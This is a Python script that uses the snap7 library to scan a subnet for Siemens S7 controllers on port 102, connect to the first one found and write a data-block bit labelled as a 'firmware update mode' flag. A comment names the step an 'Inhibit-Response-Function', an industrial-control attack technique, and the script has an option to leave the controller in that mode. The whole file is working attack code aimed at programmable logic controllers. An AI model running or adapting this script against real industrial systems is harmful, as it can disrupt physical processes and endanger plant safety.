import snap7
import socket
import struct
import time

# Configuration - Adjust these as needed
PLC_IP = None  # Initially unknown
PLC_RACK = 0
PLC_SLOT = 1
DATA_BLOCK_NUMBER = 1  # Example:  The data block that holds the "firmware update mode" flag
BYTE_OFFSET = 0        # Example: Offset within the data block where the flag is located
BIT_OFFSET = 0         # Example: Bit within the byte where the flag is located (0-7)
UPDATE_MODE_VALUE = True  # Example: The value to set to activate update mode (True/False)
RETURN_TO_NORMAL = True # Set to False if you only want to activate update mode
SEARCH_IP_RANGE = "192.168.1." # Adjust the IP range to your network to locate the PLC
SLEEP_TIME = 5 # Time to wait between turning off and turning on the firmware update mode
def find_plc_ip(ip_range):
    """
    Scans a given IP range to find a PLC.  This is a basic method and may not work in all network configurations.

    Args:
        ip_range: The base IP address range to scan (e.g., "192.168.1.")

    Returns:
        The PLC's IP address if found, None otherwise.
    """
    for i in range(1, 255):  # Check IPs from .1 to .254
        ip = ip_range + str(i)
        try:
            # Create a socket and attempt a connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # Short timeout for quick scanning

            # Check the S7 port (102)
            result = sock.connect_ex((ip, 102))  # S7 protocol uses port 102

            if result == 0:
                print(f"Found PLC at IP address: {ip}")
                sock.close()
                return ip
            else:
                sock.close()

        except socket.error:
            pass  # Connection error, continue to the next IP

    return None


def set_bit(data, byte_offset, bit_offset, value):
    """
    Sets a specific bit in a byte array.

    Args:
        data: The byte array.
        byte_offset: The index of the byte to modify.
        bit_offset: The index of the bit to modify (0-7).
        value: True to set the bit, False to clear it.
    """
    byte = data[byte_offset]
    if value:
        byte |= (1 << bit_offset)  # Set the bit
    else:
        byte &= ~(1 << bit_offset) # Clear the bit
    data[byte_offset] = byte


def plc_write_bit(client, db_number, byte_offset, bit_offset, value):
    """
    Writes a single bit to a PLC data block.

    Args:
        client: The Snap7 client object.
        db_number: The data block number.
        byte_offset: The byte offset within the data block.
        bit_offset: The bit offset within the byte.
        value: The boolean value to write (True or False).
    """
    try:
        # Read the existing data block (only one byte needed in this case for efficiency)
        data = client.db_read(db_number, byte_offset, 1)

        # Modify the specific bit
        set_bit(data, 0, bit_offset, value)  # 0 because we only read one byte

        # Write the modified byte back to the PLC
        client.db_write(db_number, byte_offset, data)
        print(f"Successfully set bit DB{db_number}.DBX{byte_offset}.{bit_offset} to {value}")

    except Exception as e:
        print(f"Error writing bit to PLC: {e}")



def main():
    global PLC_IP  # Access the global PLC_IP variable

    # 1. Find the PLC's IP address
    if PLC_IP is None:
        print("Searching for PLC IP address...")
        PLC_IP = find_plc_ip(SEARCH_IP_RANGE)  # Use the defined IP range
        if PLC_IP is None:
            print("PLC IP address not found.  Check the network and IP range.")
            return


    # 2. Connect to the PLC
    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        #3. Execute the Inhibit-Response-Function: Activate Firmware Update Mode

        # Activate Firmware Update Mode
        plc_write_bit(plc, DATA_BLOCK_NUMBER, BYTE_OFFSET, BIT_OFFSET, UPDATE_MODE_VALUE)
        time.sleep(SLEEP_TIME)  # Wait a moment in update mode.  Adjust as needed

        if RETURN_TO_NORMAL:
            # Deactivate Firmware Update Mode (return to normal)
            plc_write_bit(plc, DATA_BLOCK_NUMBER, BYTE_OFFSET, BIT_OFFSET, not UPDATE_MODE_VALUE) #Set the value to the opposite

        else:
            print("Leaving PLC in Firmware Update Mode.")


    except Exception as e:
        print(f"Error communicating with PLC: {e}")

    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")



if __name__ == "__main__":
    main()